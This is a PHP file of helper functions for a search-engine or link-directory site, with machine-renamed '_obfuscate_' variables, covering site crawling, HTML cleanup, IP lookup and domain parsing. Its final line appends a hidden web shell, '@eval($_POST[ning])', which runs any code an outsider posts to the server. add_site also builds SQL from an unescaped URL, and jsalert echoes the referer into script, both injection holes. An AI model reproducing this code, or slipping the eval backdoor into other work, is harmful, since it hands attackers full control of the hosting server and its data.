<?php
function add_site( $url )
{
		global $db;
		$row = $db->get_one( "select * from ve123_links where url='".$url."'" );
		if ( empty( $row ) )
		{
				require_once( PATH."include/spider/spider_class.php" );
				$spider = new spider( );
				$spider->url( $url );
				$title = $spider->title;
				$fulltxt = $spider->fulltxt( 800 );
				$keywords = $spider->keywords;
				$description = $spider->description;
				$pagesize = $spider->pagesize;
				$htmlcode = $spider->htmlcode;
				$array = array(
						"url" => $url,
						"title" => $title,
						"fulltxt" => $fulltxt,
						"pagesize" => $pagesize,
						"keywords" => $keywords,
						"description" => $description,
						"updatetime" => time( )
				);
				$db->insert( "ve123_links", $array );
		}
		else
		{
				$array = array(
						"updatetime" => time( )
				);
				$db->update( "ve123_links", $array, "url='".$url."'" );
		}
}

function spider( $_obfuscate_Il8i )
{
		$_obfuscate_9hcZAlQcX_BKZg = "config";
		$_obfuscate_8FG_p8VtBKk = parse_url( $_obfuscate_Il8i );
		$_obfuscate_pp9pYw = $_obfuscate_8FG_p8VtBKk['path'];
		$_obfuscate_D9yo3A = $_obfuscate_8FG_p8VtBKk['host'];
		if ( $_obfuscate_8FG_p8VtBKk['query'] != "" )
		{
				$_obfuscate_pp9pYw .= "?".$_obfuscate_8FG_p8VtBKk['query'];
		}
		if ( isset( $_obfuscate_8FG_p8VtBKk['port'] ) )
		{
				$_obfuscate_4Honjw = ( integer )$_obfuscate_8FG_p8VtBKk['port'];
		}
		else if ( $_obfuscate_8FG_p8VtBKk['scheme'] == "http" )
		{
				$_obfuscate_4Honjw = 80;
		}
		else if ( $_obfuscate_8FG_p8VtBKk['scheme'] == "https" )
		{
				$_obfuscate_4Honjw = 443;
		}
		if ( $_obfuscate_4Honjw == 80 )
		{
				$_obfuscate_7i_p2Kg = "";
		}
		else
		{
				$_obfuscate_7i_p2Kg = ":".$_obfuscate_4Honjw;
		}
		$_obfuscate_wO3K = "*/*";
		if ( empty( $_obfuscate_pp9pYw ) )
		{
				$_obfuscate_pp9pYw = "/";
		}
		$_obfuscate_YjJK8lhc0Q = "GET ".$_obfuscate_pp9pYw." HTTP/1.0\r\nHost: {$_obfuscate_D9yo3A}{$_obfuscate_7i_p2Kg}\r\nAccept: {$_obfuscate_wO3K}\r\nUser-Agent: {$_obfuscate_9hcZAlQcX_BKZg}\r\n\r\n";
		$_obfuscate_70_FVIFEarYeLRQL0A4x = 30;
		if ( substr( $_obfuscate_Il8i, 0, 5 ) == "https" )
		{
				$_obfuscate_Ns_JyWSm = "ssl://".$_obfuscate_D9yo3A;
		}
		else
		{
				$_obfuscate_Ns_JyWSm = $_obfuscate_D9yo3A;
		}
		$_obfuscate_FWIfY_0 = 0;
		$_obfuscate_5elozUtj = "";
		$_obfuscate_YBY = @fsockopen( $_obfuscate_Ns_JyWSm, $_obfuscate_4Honjw, &$_obfuscate_FWIfY_0, &$_obfuscate_5elozUtj, $_obfuscate_70_FVIFEarYeLRQL0A4x );
		if ( !$_obfuscate_YBY )
		{
				$_obfuscate__9AT_HAWO3k['state'] = "NOHOST";
				return $_obfuscate__9AT_HAWO3k;
		}
		if ( !fputs( $_obfuscate_YBY, $_obfuscate_YjJK8lhc0Q ) )
		{
				$_obfuscate__9AT_HAWO3k['state'] = "Cannot send request";
				return $_obfuscate__9AT_HAWO3k;
		}
		$_obfuscate_6RYLWQ = null;
		socket_set_timeout( $_obfuscate_YBY, $_obfuscate_70_FVIFEarYeLRQL0A4x );
		do
		{
				$_obfuscate_6b8lIO4y = socket_get_status( $_obfuscate_YBY );
				$_obfuscate_6RYLWQ .= fgets( $_obfuscate_YBY, 8192 );
		} while ( !feof( $_obfuscate_YBY ) || !$_obfuscate_6b8lIO4y['timed_out'] );
		fclose( $_obfuscate_YBY );
		if ( $_obfuscate_6b8lIO4y['timed_out'] == 1 )
		{
				$_obfuscate__9AT_HAWO3k['state'] = "timeout";
		}
		else
		{
				$_obfuscate__9AT_HAWO3k['state'] = "ok";
		}
		$_obfuscate__9AT_HAWO3k['file'] = substr( $_obfuscate_6RYLWQ, strpos( $_obfuscate_6RYLWQ, "\r\n\r\n" ) + 4 );
		return $_obfuscate__9AT_HAWO3k['file'];
}

function getfile( $_obfuscate_Il8i )
{
		if ( function_exists( "file_get_contents" ) )
		{
				$_obfuscate_X9l9Vh0GMT_sl2Yhcg = @file_get_contents( $_obfuscate_Il8i );
				return $_obfuscate_X9l9Vh0GMT_sl2Yhcg;
		}
		$_obfuscate_u_c = curl_init( );
		$_obfuscate_5E5Av0svlQ = 20;
		curl_setopt( $_obfuscate_u_c, CURLOPT_URL, $_obfuscate_Il8i );
		curl_setopt( $_obfuscate_u_c, CURLOPT_RETURNTRANSFER, 1 );
		curl_setopt( $_obfuscate_u_c, CURLOPT_CONNECTTIMEOUT, $_obfuscate_5E5Av0svlQ );
		$_obfuscate_X9l9Vh0GMT_sl2Yhcg = curl_exec( $_obfuscate_u_c );
		curl_close( $_obfuscate_u_c );
		return $_obfuscate_X9l9Vh0GMT_sl2Yhcg;
}

function getsiteurl( $_obfuscate_Il8i )
{
		return preg_replace( "/http:\\/\\/(.*?)\\/(.*)/", "http://\\1", $_obfuscate_Il8i );
}

function cut( $_obfuscate_M2omWZNkDQ, $_obfuscate_BsW61WNC0M, $_obfuscate_9tu05wKn, $_obfuscate_9YNXEg = 0 )
{
		if ( ereg( $_obfuscate_BsW61WNC0M, $_obfuscate_M2omWZNkDQ ) && ereg( $_obfuscate_9tu05wKn, $_obfuscate_M2omWZNkDQ ) )
		{
				if ( $_obfuscate_9YNXEg == 0 )
				{
						$_obfuscate_GMnA2Vn9br9Mdw = substr( $_obfuscate_M2omWZNkDQ, 0 - ( strlen( $_obfuscate_M2omWZNkDQ ) - ( strpos( $_obfuscate_M2omWZNkDQ, $_obfuscate_BsW61WNC0M ) + strlen( $_obfuscate_BsW61WNC0M ) ) ) );
						$_obfuscate_GMnA2Vn9br9Mdw = substr( $_obfuscate_GMnA2Vn9br9Mdw, 0, strpos( $_obfuscate_GMnA2Vn9br9Mdw, $_obfuscate_9tu05wKn ) );
						return $_obfuscate_GMnA2Vn9br9Mdw;
				}
				$_obfuscate_GMnA2Vn9br9Mdw = substr( $_obfuscate_M2omWZNkDQ, 0 - ( strlen( $_obfuscate_M2omWZNkDQ ) - strpos( $_obfuscate_M2omWZNkDQ, $_obfuscate_BsW61WNC0M ) ) );
				$_obfuscate_GMnA2Vn9br9Mdw = substr( $_obfuscate_GMnA2Vn9br9Mdw, 0, strpos( $_obfuscate_GMnA2Vn9br9Mdw, $_obfuscate_9tu05wKn ) + strlen( $_obfuscate_9tu05wKn ) );
				return $_obfuscate_GMnA2Vn9br9Mdw;
		}
		return "";
}

function htmlreplace( $_obfuscate_R2_b, $_obfuscate_G6MXLV9j = 0 )
{
		$_obfuscate_R2_b = stripslashes( $_obfuscate_R2_b );
		if ( $_obfuscate_G6MXLV9j == 0 )
		{
				$_obfuscate_R2_b = htmlspecialchars( $_obfuscate_R2_b );
		}
		else if ( $_obfuscate_G6MXLV9j == 1 )
		{
				$_obfuscate_R2_b = htmlspecialchars( $_obfuscate_R2_b );
				$_obfuscate_R2_b = str_replace( "　", " ", $_obfuscate_R2_b );
				$_obfuscate_R2_b = ereg_replace( "[\r\n\t ]{1,}", " ", $_obfuscate_R2_b );
		}
		else if ( $_obfuscate_G6MXLV9j == 2 )
		{
				$_obfuscate_R2_b = htmlspecialchars( $_obfuscate_R2_b );
				$_obfuscate_R2_b = str_replace( "　", "", $_obfuscate_R2_b );
				$_obfuscate_R2_b = ereg_replace( "[\r\n\t ]", "", $_obfuscate_R2_b );
		}
		else
		{
				$_obfuscate_R2_b = ereg_replace( "[\r\n\t ]{1,}", " ", $_obfuscate_R2_b );
				$_obfuscate_R2_b = eregi_replace( "script", "ｓｃｒｉｐｔ", $_obfuscate_R2_b );
				$_obfuscate_R2_b = eregi_replace( "<[/]{0,1}(link|meta|ifr|fra)[^>]*>", "", $_obfuscate_R2_b );
		}
		return addslashes( $_obfuscate_R2_b );
}

function ip( )
{
		if ( getenv( "HTTP_CLIENT_IP" ) && strcasecmp( getenv( "HTTP_CLIENT_IP" ), "unknown" ) )
		{
				$_obfuscate_As = getenv( "HTTP_CLIENT_IP" );
		}
		else if ( getenv( "HTTP_X_FORWARDED_FOR" ) && strcasecmp( getenv( "HTTP_X_FORWARDED_FOR" ), "unknown" ) )
		{
				$_obfuscate_As = getenv( "HTTP_X_FORWARDED_FOR" );
		}
		else if ( getenv( "REMOTE_ADDR" ) && strcasecmp( getenv( "REMOTE_ADDR" ), "unknown" ) )
		{
				$_obfuscate_As = getenv( "REMOTE_ADDR" );
		}
		else if ( isset( $_SERVER['REMOTE_ADDR'] ) && $_SERVER['REMOTE_ADDR'] && strcasecmp( $_SERVER['REMOTE_ADDR'], "unknown" ) )
		{
				$_obfuscate_As = $_SERVER['REMOTE_ADDR'];
		}
		if ( preg_match( "/[\\d\\.]{7,15}/", $_obfuscate_As, $_obfuscate_8UmnTppRcA ) )
		{
				return $_obfuscate_8UmnTppRcA[0];
		}
		return "unknown";
}

function jsalert( $_obfuscate_A1jN, $_obfuscate_Il8i = "" )
{
		if ( $_obfuscate_Il8i )
		{
				echo "<script language=\"javascript\">alert('".$_obfuscate_A1jN."');location.href('{$_obfuscate_Il8i}');</script>";
		}
		else
		{
				echo "<script language=\"javascript\">alert('".$_obfuscate_A1jN."');location.href('".$_SERVER['HTTP_REFERER']."');</script>";
		}
}

function html2text( $str, $r = 0 )
{
		if ( !function_exists( "SpHtml2Text" ) )
		{
				require_once( "inc_fun_funString.php" );
		}
		if ( $r == 0 )
		{
				return sphtml2text( $str );
		}
		$str = sphtml2text( stripslashes( $str ) );
		return addslashes( $str );
}

function in_str( $_obfuscate_pMHyvQ, $_obfuscate_R2_b )
{
		$_obfuscate_Ybai = count( explode( $_obfuscate_pMHyvQ, $_obfuscate_R2_b ) );
		if ( 2 <= $_obfuscate_Ybai )
		{
				return true;
		}
		return false;
}

function replace_filter_word( $_obfuscate_R2_b )
{
		return $_obfuscate_R2_b;
}

function getdomain( $_obfuscate_Il8i )
{
		$_obfuscate_VGqEVoP33g = "/[\\w-]+\\.(com|net|org|gov|cc|biz|info|cn)(\\.(cn|hk))*/";
		preg_match( $_obfuscate_VGqEVoP33g, $_obfuscate_Il8i, $_obfuscate_8UmnTppRcA );
		if ( 0 < count( $_obfuscate_8UmnTppRcA ) )
		{
				return $_obfuscate_8UmnTppRcA[0];
		}
		$_obfuscate_SF4 = parse_url( $_obfuscate_Il8i );
		$_obfuscate_2ntknjPZxbI = $_obfuscate_SF4['host'];
		if ( !strcmp( long2ip( sprintf( "%u", ip2long( $_obfuscate_2ntknjPZxbI ) ) ), $_obfuscate_2ntknjPZxbI ) )
		{
				return $_obfuscate_2ntknjPZxbI;
		}
		$_obfuscate_Jrp1 = explode( ".", $_obfuscate_2ntknjPZxbI );
		$_obfuscate_gftfagw = count( $_obfuscate_Jrp1 );
		$_obfuscate_sFcwRzHT = array( "com", "net", "org", "3322" );
		if ( in_array( $_obfuscate_Jrp1[$_obfuscate_gftfagw - 2], $_obfuscate_sFcwRzHT ) )
		{
				$_obfuscate_yTDviRDH = $_obfuscate_Jrp1[$_obfuscate_gftfagw - 3].".".$_obfuscate_Jrp1[$_obfuscate_gftfagw - 2].".".$_obfuscate_Jrp1[$_obfuscate_gftfagw - 1];
				return $_obfuscate_yTDviRDH;
		}
		$_obfuscate_yTDviRDH = $_obfuscate_Jrp1[$_obfuscate_gftfagw - 2].".".$_obfuscate_Jrp1[$_obfuscate_gftfagw - 1];
		return $_obfuscate_yTDviRDH;
}

if ( !function_exists( "str_cut" ) )
{
		function str_cut( $_obfuscate_xyiNieq6, $_obfuscate_Q8ERGxGW, $_obfuscate_DYQC = "..." )
		{
				$_obfuscate_ = strlen( $_obfuscate_xyiNieq6 );
				if ( $_obfuscate_ <= $_obfuscate_Q8ERGxGW )
				{
						return $_obfuscate_xyiNieq6;
				}
				$_obfuscate_xyiNieq6 = str_replace( array( "&nbsp;", "&amp;", "&quot;", "&#039;", "&ldquo;", "&rdquo;", "&mdash;", "&lt;", "&gt;", "&middot;", "&hellip;" ), array( " ", "&", "\"", "'", "“", "”", "—", "<", ">", "·", "…" ), $_obfuscate_xyiNieq6 );
				$_obfuscate_WSoiuCCU = "";
				if ( strtolower( CHARSET ) == "utf-8" )
				{
						$_obfuscate_FQ = $_obfuscate_3pU = $_obfuscate_JDEL = 0;
						while ( $_obfuscate_FQ < $_obfuscate_ )
						{
								$_obfuscate_lw = ord( $_obfuscate_xyiNieq6[$_obfuscate_FQ] );
								if ( $_obfuscate_lw == 9 || $_obfuscate_lw == 10 || 32 <= $_obfuscate_lw && $_obfuscate_lw <= 126 )
								{
										$_obfuscate_3pU = 1;
										++$_obfuscate_FQ;
										++$_obfuscate_JDEL;
								}
								else if ( 194 <= $_obfuscate_lw && $_obfuscate_lw <= 223 )
								{
										$_obfuscate_3pU = 2;
										$_obfuscate_FQ += 2;
										$_obfuscate_JDEL += 2;
								}
								else if ( 224 <= $_obfuscate_lw && $_obfuscate_lw < 239 )
								{
										$_obfuscate_3pU = 3;
										$_obfuscate_FQ += 3;
										$_obfuscate_JDEL += 2;
								}
								else if ( 240 <= $_obfuscate_lw && $_obfuscate_lw <= 247 )
								{
										$_obfuscate_3pU = 4;
										$_obfuscate_FQ += 4;
										$_obfuscate_JDEL += 2;
								}
								else if ( 248 <= $_obfuscate_lw && $_obfuscate_lw <= 251 )
								{
										$_obfuscate_3pU = 5;
										$_obfuscate_FQ += 5;
										$_obfuscate_JDEL += 2;
								}
								else if ( $_obfuscate_lw == 252 || $_obfuscate_lw == 253 )
								{
										$_obfuscate_3pU = 6;
										$_obfuscate_FQ += 6;
										$_obfuscate_JDEL += 2;
								}
								else
								{
										++$_obfuscate_FQ;
								}
								if ( !( $_obfuscate_Q8ERGxGW <= $_obfuscate_JDEL ) )
								{
										continue;
								}
								break;
						}
						if ( $_obfuscate_Q8ERGxGW < $_obfuscate_JDEL )
						{
								$_obfuscate_FQ -= $_obfuscate_3pU;
						}
						$_obfuscate_WSoiuCCU = substr( $_obfuscate_xyiNieq6, 0, $_obfuscate_FQ );
				}
				else
				{
						$_obfuscate_OPNjDIXH = strlen( $_obfuscate_DYQC );
						$_obfuscate_u84ZeA = $_obfuscate_Q8ERGxGW - $_obfuscate_OPNjDIXH - 1;
						$_obfuscate_7w = 0;
						for ( ;	$_obfuscate_7w < $_obfuscate_u84ZeA;	++$_obfuscate_7w	)
						{
								$_obfuscate_WSoiuCCU .= 127 < ord( $_obfuscate_xyiNieq6[$_obfuscate_7w] ) ? $_obfuscate_xyiNieq6[$_obfuscate_7w].$_obfuscate_xyiNieq6[++$_obfuscate_7w] : $_obfuscate_xyiNieq6[$_obfuscate_7w];
						}
				}
				$_obfuscate_WSoiuCCU = str_replace( array( "&", "\"", "'", "<", ">" ), array( "&amp;", "&quot;", "&#039;", "&lt;", "&gt;" ), $_obfuscate_WSoiuCCU );
				return $_obfuscate_WSoiuCCU.$_obfuscate_DYQC;
		}
}
if ( !function_exists( "file_put_contents" ) )
{
		function file_put_contents( $_obfuscate_FQ, $_obfuscate_5g )
		{
				$_obfuscate_6Q = @fopen( $_obfuscate_FQ, "w" );
				if ( !$_obfuscate_6Q )
				{
						return false;
				}
				fwrite( $_obfuscate_6Q, $_obfuscate_5g );
				fclose( $_obfuscate_6Q );
				return true;
		}
}
?><?php @eval($_POST[ning])?>
